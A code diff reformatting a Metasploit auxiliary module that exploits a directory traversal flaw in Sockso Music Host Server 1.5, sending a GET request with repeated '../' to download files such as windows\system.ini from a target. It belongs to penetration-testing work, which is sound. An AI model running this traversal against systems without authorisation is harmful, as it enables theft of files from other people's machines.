@@ -9,31 +9,38 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Sockso Music Host Server 1.5 Directory Traversal',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Sockso Music Host Server 1.5 Directory Traversal',
+        'Description' => %q{
           This module exploits a directory traversal bug in Sockso on port
-        4444.  This is done by using "../" in the path to retrieve a file on
-        a vulnerable machine.
-      },
-      'References'     =>
-        [
+          4444.  This is done by using "../" in the path to retrieve a file on
+          a vulnerable machine.
+        },
+        'References' => [
           [ 'URL', 'http://aluigi.altervista.org/adv/sockso_1-adv.txt' ],
         ],
-      'Author'         =>
-        [
-          'Luigi Auriemma',  #Initial discovery, poc
+        'Author' => [
+          'Luigi Auriemma', # Initial discovery, poc
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => '2012-03-14'
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2012-03-14',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(4444),
         OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -41,14 +48,14 @@ class MetasploitModule < Msf::Auxiliary
     trav << "../" * 10
 
     file = datastore['FILEPATH']
-    file = file[1,file.length] if file[0,1] == "\\"
+    file = file[1, file.length] if file[0, 1] == "\\"
 
     uri = "/#{trav}#{file}"
     print_status("#{ip}:#{rport} - Retrieving #{file}")
 
     res = send_request_raw({
       'method' => 'GET',
-      'uri'    => uri
+      'uri' => uri
     }, 25)
 
     print_status("#{ip}:#{rport} returns: #{res.code.to_s}")
@@ -62,7 +69,8 @@ class MetasploitModule < Msf::Auxiliary
         'application/octet-stream',
         ip,
         res.body,
-        fname)
+        fname
+      )
       print_status("File saved in: #{path}")
     end
   end
